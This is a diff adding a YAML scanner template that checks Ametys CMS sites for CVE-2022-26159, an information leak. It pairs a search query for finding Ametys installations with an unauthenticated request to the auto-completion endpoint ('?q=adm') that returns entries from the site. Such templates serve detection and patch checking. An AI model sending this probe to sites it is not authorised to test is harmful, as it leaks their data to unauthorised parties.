@@ -1,0 +1,19 @@
+name: Ametys CMS infoleak CVE-2022-26159
+manual: true
+query: title="ametys" || body="ametys"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /plugins/web/service/search/auto-completion/domain/en.xml?q=adm
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"item")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-26159
+  - https://issues.ametys.org/browse/CMS-10973
+  description: Ametys is a Java-based open source CMS (Content Management System)
+    combining rich content with an easy-to-use and intuitive interface.
+  tags: infoleak
